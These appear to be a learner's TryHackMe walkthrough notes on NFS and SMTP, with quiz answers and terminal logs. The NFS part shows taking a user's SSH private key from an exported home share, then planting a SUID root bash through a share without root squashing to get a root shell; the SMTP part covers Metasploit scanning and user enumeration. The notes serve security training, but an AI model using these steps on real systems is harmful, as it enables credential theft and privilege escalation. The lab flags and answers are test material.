TASK 2: Understanding NFS
- NFS stands for "Network File System" and allows a system to share directories and files with others over a network.
- By using NFS, users and programs can access files on remote systems almost as if they were local files.
- It does this by mounting all, or a portion of a file system on a server. 
- The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file
- First, the client will request to mount a directory from a remote host on a local directory just the same way it can mount a physical device.
- The mount service will then act to connect to the relevant mount daemon using RPC.
- The server checks if the user has permission to mount whatever directory has been requested. It will then return a file handle which uniquely identifies each file and directory that is on the server.
- If someone wants to access a file using NFS, an RPC call is placed to NFSD (the NFS daemon) on the server. 
  -> This call takes parameters such as:
    i.  The file handle
    ii. The name of the file to be accessed
    iii. The user's, user ID
    iv. The user's group ID
  -> These are used in determining access rights to the specified file. This is what controls user permissions, I.E read and write of files.
- Using the NFS protocol, you can transfer files between computers running Windows and other non-Windows operating systems, such as Linux, MacOS or UNIX.
- A computer running Windows Server can act as an NFS file server for other non-Windows client computers. Likewise, NFS allows a Windows-based computer running Windows Server to access files stored on a non-Windows NFS server.
- More information:
  i. https://www.datto.com/blog/what-is-nfs-file-share/
  ii. http://nfs.sourceforge.net/
  iii. https://wiki.archlinux.org/index.php/NFS

a. What does NFS stand for?
sol. Network File System

b. What process allows an NFS client to interact with a remote directory as though it was a physical device?
sol. mounting

c. What does NFS use to represent files and directories on the server?
sol.  file handle

d. What protocol does NFS use to communicate between the server and client?
sol. RPC

e. What two pieces of user data does the NFS server take as parameters for controlling user permissions? Format: parameter 1 / parameter 2
sol. user id/group id

f. Can a Windows NFS server share files with a Linux client? (Y/N)
sol. Y

g. Can a Linux NFS server share files with a MacOS client? (Y/N)
sol. Y

h. What is the latest version of NFS? [released in 2016, but is still up to date as of 2020] This will require external research.
sol. 4.2

TASK 3: Enumerating NFS
- Enumeration is defined as "a process which establishes an active connection to the target hosts to discover potential attack vectors in the system, and the same can be used for further exploitation of the system." - Infosec Institute.
- In order to do a more advanced enumeration of the NFS server, and shares- we're going to need a few tools. The first of which is key to interacting with any NFS share from your local machine: nfs-common.
- NFS-Common 
  -> It is important to have this package installed on any machine that uses NFS, either as client or server
  ->  It includes programs such as: lockd, statd, showmount, nfsstat, gssd, idmapd and mount.nfs. 
  -> Primarily, we are concerned with "showmount" and "mount.nfs" as these are going to be most useful to us when it comes to extracting information from the NFS share.
  -> more info : https://packages.ubuntu.com/jammy/nfs-common
- The first step of enumeration is to conduct a port scan, to find out as much information as you can about the services, open ports and operating system of the target machine. You can go as in-depth as you like on this, however, I suggest using nmap with the -A and -p- tags.
- Mounting NFS shares
  -> Your client’s system needs a directory where all the content shared by the host server in the export folder can be accessed.
  -> You can create this folder anywhere on your system. Once you've created this mount point, you can use the "mount" command to connect the NFS share to the mount point on your machine like so:
        sudo mount -t nfs IP:share /tmp/mount/ -nolock
        Let's break this down

Tag					Function
sudo			Run as root
mount			Execute the mount command
-t nfs			Type of device to mount, then specifying that it's NFS
IP:share		The IP Address of the NFS server, and the name of the share we wish to mount
-nolock			Specifies not to use NLM locking

a. Conduct a thorough port scan scan of your choosing, how many ports are open?
sol. 7
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- -T4 -A 10.10.79.146     
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-18 22:51 EDT
Stats: 0:01:31 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 29.04% done; ETC: 22:56 (0:03:40 remaining)
Stats: 0:02:49 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 38.54% done; ETC: 22:59 (0:04:30 remaining)
Stats: 0:06:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 67.37% done; ETC: 23:00 (0:02:57 remaining)
Nmap scan report for 10.10.79.146
Host is up (0.20s latency).
Not shown: 65528 closed tcp ports (reset)
	PORT      STATE SERVICE  VERSION
1.	22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 73:92:8e:04:de:40:fb:9c:90:f9:cf:42:70:c8:45:a7 (RSA)
	|   256 6d:63:d6:b8:0a:67:fd:86:f1:22:30:2b:2d:27:1e:ff (ECDSA)
	|_  256 bd:08:97:79:63:0f:80:7c:7f:e8:50:dc:59:cf:39:5e (ED25519)
2.	111/tcp   open  rpcbind  2-4 (RPC #100000)
	| rpcinfo: 
	|   program version    port/proto  service
	|   100227  3           2049/tcp   nfs_acl
	|   100227  3           2049/tcp6  nfs_acl
	|   100227  3           2049/udp   nfs_acl
	|_  100227  3           2049/udp6  nfs_acl
3.	2049/tcp  open  nfs_acl  3 (RPC #100227)
4.	37809/tcp open  nlockmgr 1-4 (RPC #100021)
5.	51813/tcp open  mountd   1-3 (RPC #100005)
6.	53019/tcp open  mountd   1-3 (RPC #100005)
7.	58873/tcp open  mountd   1-3 (RPC #100005)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=10/18%OT=22%CT=1%CU=35697%PV=Y%DS=2%DC=T%G=Y%TM=671
OS:32129%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A
OS:)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%C
OS:I=Z%II=I%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508S
OS:T11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5
OS:=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%
OS:T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   211.42 ms 10.9.0.1
2   211.82 ms 10.10.79.146

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 621.30 seconds

b. Which port contains the service we're looking to enumerate?
sol. 2049

c. Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?
sol. /home
┌──(kali㉿kali)-[~]
└─$ /usr/sbin/showmount -e 10.10.79.146
Export list for 10.10.79.146:
/home *

d. Time to mount the share to our local machine!
First, use "mkdir /tmp/mount" to create a directory on your machine to mount the share to. This is in the /tmp directory- so be aware that it will be removed on restart.
Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?
sol. cappucino
┌──(kali㉿kali)-[/tmp/mount]
└─$ sudo mount -t nfs 10.10.79.146:/home /tmp/mount -o nolock
┌──(kali㉿kali)-[/tmp]
└─$ ls -la mount                        
total 12
drwxr-xr-x  3 root root 4096 Apr 21  2020 .
drwxrwxrwt 17 root root 4096 Oct 18 23:12 ..
drwxr-xr-x  5 kali kali 4096 Jun  4  2020 cappucino

e. Have a look inside this directory, look at the files. Looks like  we're inside a user's home directory...
sol.
┌──(kali㉿kali)-[/tmp/mount/cappucino]
└─$ ls -la
total 36
drwxr-xr-x 5 kali kali 4096 Jun  4  2020 .
drwxr-xr-x 3 root root 4096 Apr 21  2020 ..
-rw------- 1 kali kali    5 Jun  4  2020 .bash_history
-rw-r--r-- 1 kali kali  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 kali kali 3771 Apr  4  2018 .bashrc
drwx------ 2 kali kali 4096 Apr 22  2020 .cache
drwx------ 3 kali kali 4096 Apr 22  2020 .gnupg
-rw-r--r-- 1 kali kali  807 Apr  4  2018 .profile
drwx------ 2 kali kali 4096 Apr 22  2020 .ssh
-rw-r--r-- 1 kali kali    0 Apr 22  2020 .sudo_as_admin_successful

f. Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?
sol. .ssh
┌──(kali㉿kali)-[/tmp/mount/cappucino]
└─$ cd .ssh 
┌──(kali㉿kali)-[/tmp/mount/cappucino/.ssh]
└─$ ls -la
total 20
drwx------ 2 kali kali 4096 Apr 22  2020 .
drwxr-xr-x 5 kali kali 4096 Jun  4  2020 ..
-rw------- 1 kali kali  399 Apr 22  2020 authorized_keys
-rw------- 1 kali kali 1679 Apr 22  2020 id_rsa
-rw-r--r-- 1 kali kali  399 Apr 22  2020 id_rsa.pub

g. Which of these keys is most useful to us?
sol. id_rsa

h. Copy this file to a different location your local machine, and change the permissions to "600" using "chmod 600 [file]".
    Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to.
    Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N)
sol. y

┌──(kali㉿kali)-[/tmp/mount/cappucino/.ssh]
└─$ ssh -i id_rsa cappucino@10.10.79.146
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
  System information as of Sat Oct 19 03:41:11 UTC 2024
  System load:  0.12              Processes:           101
  Usage of /:   45.2% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.79.146
  Swap usage:   0%
44 packages can be updated.
0 updates are security updates.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
Last login: Sat Oct 19 03:38:22 2024 from 10.9.0.101
cappucino@polonfs:~$ 

TASK 4: Exploiting NFS
- if you have a low privilege shell on any machine and you found that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it is configured.
- By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume.
- Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges.
-  However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.
- So, what are files with the SUID bit set? Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group. In this case, as the super-user. We can leverage this to get a shell with these privileges!
- Method
	-> We're able to upload files to the NFS share, and control the permissions of these files.
	-> We can set the permissions of whatever we upload, in this case a bash shell executable
	->  We can then log in through SSH, as we did in the previous task- and execute this executable to gain a root shell!
- Executable
	-> Due to compatibility reasons,  we will obtain the bash executable directly from the target machine.
	-> With the key obtained in the previous task, we can use SCP with the command 
		scp -i key_name username@10.10.57.171:/bin/bash ~/Downloads/bash 
	   to download it onto our attacking machine.
	-> Another method to overcome compatibility issues is to obtain a standard Ubuntu Server 18.04 bash executable, the same as the server's- as we know from our nmap scan. 
	->  You can use 
		wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash 
	    to download it in another way.

a. First, change directory to the mount point on your machine, where the NFS share should still be mounted, and then into the user's home directory.
┌──(kali㉿kali)-[~]
└─$ cd /tmp                                                                                                              
b. Download the bash executable. Then use "cp ~/Downloads/bash ." to copy the bash executable to the NFS share.
The copied bash shell must be owned by a root user, you can set this using "sudo chown root bash"
┌──(kali㉿kali)-[/tmp]
└─$ wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
--2024-10-20 03:09:06--  https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
Resolving github.com (github.com)... 20.207.73.82
Connecting to github.com (github.com)|20.207.73.82|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://raw.githubusercontent.com/polo-sec/writing/master/Security%20Challenge%20Walkthroughs/Networks%202/bash [following]
--2024-10-20 03:09:09--  https://raw.githubusercontent.com/polo-sec/writing/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1113504 (1.1M) [application/octet-stream]
Saving to: ‘bash’

bash                         100%[==============================================>]   1.06M  6.41MB/s    in 0.2s    

2024-10-20 03:09:11 (6.41 MB/s) - ‘bash’ saved [1113504/1113504]                                                                                                              
┌──(kali㉿kali)-[/tmp]
└─$ ls
bash
mount
ssh-ylVNz6FIAqHv
systemd-private-4e83e62d77ae42ef96e4353c5e606ba0-colord.service-p34aYT
systemd-private-4e83e62d77ae42ef96e4353c5e606ba0-haveged.service-6PfuPi
systemd-private-4e83e62d77ae42ef96e4353c5e606ba0-ModemManager.service-5b6YJj
systemd-private-4e83e62d77ae42ef96e4353c5e606ba0-polkit.service-iWilJv
systemd-private-4e83e62d77ae42ef96e4353c5e606ba0-systemd-logind.service-9AhFmc
systemd-private-4e83e62d77ae42ef96e4353c5e606ba0-upower.service-7O7tCN
VMwareDnD
vmware-root
vmware-root_545-4257003801
┌──(kali㉿kali)-[/tmp]
└─$ cp bash /tmp/mount/cappucino   
┌──(kali㉿kali)-[/tmp]
└─$ cd mount/cappucino   
┌──(kali㉿kali)-[/tmp/mount/cappucino]
└─$ ls -la
total 1124
drwxr-xr-x 5 kali kali    4096 Oct 20 03:16 .
drwxr-xr-x 3 root root    4096 Apr 21  2020 ..
-rw-r--r-- 1 kali kali 1113504 Oct 20 03:16 bash
-rw------- 1 kali kali       5 Jun  4  2020 .bash_history
-rw-r--r-- 1 kali kali     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 kali kali    3771 Apr  4  2018 .bashrc
drwx------ 2 kali kali    4096 Apr 22  2020 .cache
drwx------ 3 kali kali    4096 Apr 22  2020 .gnupg
-rw-r--r-- 1 kali kali     807 Apr  4  2018 .profile
drwx------ 2 kali kali    4096 Apr 22  2020 .ssh
-rw-r--r-- 1 kali kali       0 Apr 22  2020 .sudo_as_admin_successful                                                                                                          
┌──(kali㉿kali)-[/tmp/mount/cappucino]
└─$ sudo chown root bash
[sudo] password for kali: 

c. Now, we're going to add the SUID bit permission to the bash executable we just copied to the share using "sudo chmod +[permission] bash". What letter do we use to set the SUID bit set using chmod?
sol. s
┌──(kali㉿kali)-[/tmp/mount/cappucino]
└─$ sudo chmod +s bash

d.Let's do a sanity check, let's check the permissions of the "bash" executable using "ls -la bash". 
What does the permission set look like? Make sure that it ends with -sr-x.
sol. 
┌──(kali㉿kali)-[/tmp/mount/cappucino]
└─$ ls -la
total 1124
drwxr-xr-x 5 kali kali    4096 Oct 20 03:16 .
drwxr-xr-x 3 root root    4096 Apr 21  2020 ..
-rwsr-sr-x 1 root kali 1113504 Oct 20 03:16 bash
-rw------- 1 kali kali       5 Jun  4  2020 .bash_history
-rw-r--r-- 1 kali kali     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 kali kali    3771 Apr  4  2018 .bashrc
drwx------ 2 kali kali    4096 Apr 22  2020 .cache
drwx------ 3 kali kali    4096 Apr 22  2020 .gnupg
-rw-r--r-- 1 kali kali     807 Apr  4  2018 .profile
drwx------ 2 kali kali    4096 Apr 22  2020 .ssh
-rw-r--r-- 1 kali kali       0 Apr 22  2020 .sudo_as_admin_successful

e. Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.
Great! If all's gone well you should have a shell as root! What's the root flag?
sol. THM{nfs_got_pwned}

┌──(kali㉿kali)-[/tmp/mount/cappucino/.ssh]
└─$ ssh -i id_rsa cappucino@10.10.79.146
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
  System information as of Sat Oct 19 03:41:11 UTC 2024
  System load:  0.12              Processes:           101
  Usage of /:   45.2% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.79.146
  Swap usage:   0%
44 packages can be updated.
0 updates are security updates.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
Last login: Sat Oct 19 03:38:22 2024 from 10.9.0.101
cappucino@polonfs:~$ ls -la
total 1124
drwxr-xr-x 5 cappucino cappucino    4096 Oct 20 07:16 .
drwxr-xr-x 3 root      root         4096 Apr 21  2020 ..
-rwsr-sr-x 1 root      cappucino 1113504 Oct 20 07:16 bash
-rw------- 1 cappucino cappucino       5 Jun  4  2020 .bash_history
-rw-r--r-- 1 cappucino cappucino     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 cappucino cappucino    3771 Apr  4  2018 .bashrc
drwx------ 2 cappucino cappucino    4096 Apr 22  2020 .cache
drwx------ 3 cappucino cappucino    4096 Apr 22  2020 .gnupg
-rw-r--r-- 1 cappucino cappucino     807 Apr  4  2018 .profile
drwx------ 2 cappucino cappucino    4096 Apr 22  2020 .ssh
-rw-r--r-- 1 cappucino cappucino       0 Apr 22  2020 .sudo_as_admin_successful
cappucino@polonfs:~$ ./bash -p
bash-4.4# ls
bash
bash-4.4# ls -la
total 1124
drwxr-xr-x 5 cappucino cappucino    4096 Oct 20 07:16 .
drwxr-xr-x 3 root      root         4096 Apr 21  2020 ..
-rwsr-sr-x 1 root      cappucino 1113504 Oct 20 07:16 bash
-rw------- 1 cappucino cappucino       5 Jun  4  2020 .bash_history
-rw-r--r-- 1 cappucino cappucino     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 cappucino cappucino    3771 Apr  4  2018 .bashrc
drwx------ 2 cappucino cappucino    4096 Apr 22  2020 .cache
drwx------ 3 cappucino cappucino    4096 Apr 22  2020 .gnupg
-rw-r--r-- 1 cappucino cappucino     807 Apr  4  2018 .profile
drwx------ 2 cappucino cappucino    4096 Apr 22  2020 .ssh
-rw-r--r-- 1 cappucino cappucino       0 Apr 22  2020 .sudo_as_admin_successful
bash-4.4# cd ..
bash-4.4# ls
cappucino
bash-4.4# cd ..
bash-4.4# ls
bin   cdrom  etc   initrd.img     lib   lost+found  mnt  proc  run   snap  swap.img  tmp  var      vmlinuz.old
boot  dev    home  initrd.img.old  lib64  media       opt  root  sbin  srv   sys       usr  vmlinuz
bash-4.4# cd root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt
THM{nfs_got_pwned}

TASK 5: Understanding SMTP
- Simple Mail Transfer Protocol
- It is utilised to handle the sending of emails. In order to support email services, a protocol pair is required, comprising of SMTP and POP/IMAP.
  Together they allow the user to send outgoing mail and retrieve incoming mail, respectively.
- The SMTP server performs three basic functions:
	-> It verifies who is sending emails through the SMTP server.
	-> It sends the outgoing mail
	-> If the outgoing mail can't be delivered it sends the message back to the sender
- Most people will have encountered SMTP when configuring a new email address on some third-party email clients, such as Thunderbird;
  as when you configure a new email client, you will need to configure the SMTP server configuration in order to send outgoing emails.
- POP (Post Office Protocol) and IMAP(Internet Message Access Protocol)
	-> They are responsible for the transfer of email between a client and a mail server.
	-> The main differences is in POP's more simplistic approach of downloading the inbox from the mail server, to the client.
	   Where IMAP will synchronise the current inbox, with new mail on the server, downloading anything new. 
	-> This means that changes to the inbox made on one computer, over IMAP, will persist if you then synchronise the inbox from another computer. 
	-> The POP/IMAP server is responsible for fulfiling this process.
- Working
	-> The user will supply the email (a letter) and a service (the postal delivery service), and through a series of steps- will deliver it to the recipients inbox (postbox). 
	-> The role of the SMTP server in this service, is to act as the sorting office, the email (letter) is picked up and sent to this server, which then directs it to the recipient.
- We can map the journey of an email from your computer to the recipient’s like this:

User -> SMTP Server -> The Wider Internet -> POP/IMAP Server -> Recipient 

1. The mail user agent, which is either your email client or an external program. connects to the SMTP server of your domain, e.g. smtp.google.com. This initiates the SMTP handshake. This connection works over the SMTP port- which is usually 25. Once these connections have been made and validated, the SMTP session starts.
2. The process of sending mail can now begin. The client first submits the sender, and recipient's email address- the body of the email and any attachments, to the server.
3. The SMTP server then checks whether the domain name of the recipient and the sender is the same.
4. The SMTP server of the sender will make a connection to the recipient's SMTP server before relaying the email. If the recipient's server can't be accessed, or is not available- the Email gets put into an SMTP queue.
5. Then, the recipient's SMTP server will verify the incoming email. It does this by checking if the domain and user name have been recognised. The server will then forward the email to the POP or IMAP server, as shown in the diagram above.
6. The E-Mail will then show up in the recipient's inbox.
 for more detailed explaination : https://computer.howstuffworks.com/e-mail-messaging/email3.htm

- SMTP Server software is readily available on Windows server platforms, with many other variants of SMTP being available to run on Linux.
-  resource that explain the technical implementation, and working of, SMTP in more detail:
	https://www.afternerd.com/blog/smtp/

a. What does SMTP stand for?
sol. Simple Mail Transfer Protocol

b. What does SMTP handle the sending of? (answer in plural)
sol. emails

c. What is the first step in the SMTP process?
sol. SMTP handshake

d. What is the default SMTP port?
sol. 25

e. Where does the SMTP server send the email if the recipient's server is not available?
sol. smtp queue

f. On what server does the Email ultimately end up on?
sol. POP/IMAP

g. Can a Linux machine run an SMTP server? (Y/N)
sol. Y

h. Can a Windows machine run an SMTP server? (Y/N)
sol. Y

TASK 6: Enumerating SMTP
- Poorly configured or vulnerable mail servers can often provide an initial foothold into a network
- but prior to launching an attack, we want to fingerprint the server to make our targeting as precise as possible.
- We're going to use the "smtp_version" module in MetaSploit to do this.
- As its name implies, it will scan a range of IP addresses and determine the version of any mail servers it encounters.
- Enumerating Users from SMTP
	-> The SMTP service has two internal commands that allow the enumeration of users:
		~ VRFY (confirming the names of valid users) 
		~ EXPN (which reveals the actual address of user’s aliases and lists of e-mail (mailing lists).
	-> Using these SMTP commands, we can reveal a list of valid users
	-> We can do this manually, over a telnet connection- however Metasploit comes to the rescue again, providing a handy module appropriately called "smtp_enum" that will do the legwork for us!
	-> Using the module is a simple matter of feeding it a host or range of hosts to scan and a wordlist containing usernames to enumerate.
- Requirements : Metasploit
- Alternatives
It's worth noting that this enumeration technique will work for the majority of SMTP configurations; however there are other, non-metasploit tools such as smtp-user-enum that work even better for enumerating OS-level user accounts on Solaris via the SMTP service. Enumeration is performed by inspecting the responses to VRFY, EXPN, and RCPT TO commands.
This technique could be adapted in future to work against other vulnerable SMTP daemons, but this hasn’t been done as of the time of writing. It's an alternative that's worth keeping in mind if you're trying to distance yourself from using Metasploit e.g. in preparation for OSCP.

a. First, lets run a port scan against the target machine, same as last time. What port is SMTP running on?
sol. 25
Nmap scan report for 10.10.249.76
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 62:a7:03:13:39:08:5a:07:80:1a:e5:27:ee:9b:22:5d (RSA)
|   256 89:d0:40:92:15:09:39:70:17:6e:c5:de:5b:59:ee:cb (ECDSA)
|_  256 56:7c:d0:c4:95:2b:77:dd:53:d6:e6:73:99:24:f6:86 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: polosmtp.home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=10/22%OT=22%CT=1%CU=31359%PV=Y%DS=2%DC=T%G=Y%TM=671
OS:7A7C1%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%TS=A)SEQ(
OS:SP=105%GCD=1%ISR=107%TI=Z%CI=Z%TS=D)SEQ(SP=105%GCD=1%ISR=107%TI=Z%CI=Z%I
OS:I=I%TS=A)SEQ(SP=106%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M508ST11NW6
OS:%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST1
OS:1)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%
OS:W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=
OS:N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN
OS:=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host:  polosmtp.home; OS: Linux; CPE: cpe:/o:linux:linux_kernel
                                                                                                                    
TRACEROUTE (using port 80/tcp)                                                                                      
HOP RTT       ADDRESS
1   181.53 ms 10.9.0.1
2   181.81 ms 10.10.249.76

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1310.85 seconds

b. Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this?
If you would like some more help or practice using Metasploit, TryHackMe has a module on Metasploit that you can check out here:
https://tryhackme.com/module/metasploit
sol. msfconsole
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole 
Metasploit tip: Use the analyze command to suggest runnable modules for 
hosts
                                                  
Call trans opt: received. 2-19-98 13:24:18 REC:Loc

     Trace program: running

           wake up, Neo...
        the matrix has you
      follow the white rabbit.

          knock, knock, Neo.

                        (`.         ,-,
                        ` `.    ,;' /
                         `.  ,'/ .'
                          `. X /.'
                .-;--''--.._` ` (
              .'            /   `
             ,           ` '   Q '
             ,         ,   `._    \
          ,.|         '     `-.;_'
          :  . `  ;    `  ` --,.._;
           ' `    ,   )   .'
              `._ ,  '   /_
                 ; ,''-,;' ``-
                  ``-..__``--`

                             https://metasploit.com


       =[ metasploit v6.3.55-dev                          ]
+ -- --=[ 2397 exploits - 1235 auxiliary - 422 post       ]
+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > 

c. Let's search for the module "smtp_version", what's it's full module name?
sol. auxiliary/scanner/smtp/smtp_version
msf6 > search smtp_version

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  auxiliary/scanner/smtp/smtp_version                   normal  No     SMTP Banner Grabber


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smtp/smtp_version

msf6 > 

d. Great, now- select the module and list the options. How do we do this?
sol. options
msf6 > use auxiliary/scanner/smtp/smtp_version
msf6 auxiliary(scanner/smtp/smtp_version) > show options

Module options (auxiliary/scanner/smtp/smtp_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                       asics/using-metasploit.html
   RPORT    25               yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smtp/smtp_version) >

e. Have a look through the options, does everything seem correct? What is the option we need to set?
sol. RHOSTS

msf6 auxiliary(scanner/smtp/smtp_version) > set RHOST 10.10.249.76
RHOST => 10.10.249.76

f. Set that to the correct value for your target machine. Then run the exploit. What's the system mail name?
sol. polosmtp.home
msf6 auxiliary(scanner/smtp/smtp_version) > show options

Module options (auxiliary/scanner/smtp/smtp_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   10.10.249.76     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                       asics/using-metasploit.html
   RPORT    25               yes       The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smtp/smtp_version) > run

[+] 10.10.249.76:25       - 10.10.249.76:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
[*] 10.10.249.76:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smtp/smtp_version) >

g. What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research.
sol. Postfix

h. Good! We've now got a good amount of information on the target system to move onto the next stage. Let's search for the module "smtp_enum", what's it's full module name?
sol. auxiliary/scanner/smtp/smtp_enum 
msf6 auxiliary(scanner/smtp/smtp_version) >back
msf6 > search smtp_enum

Matching Modules
================

   #  Name                              Disclosure Date  Rank    Check  Description
   -  ----                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/smtp/smtp_enum                   normal  No     SMTP User Enumeration Utility


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smtp/smtp_enum

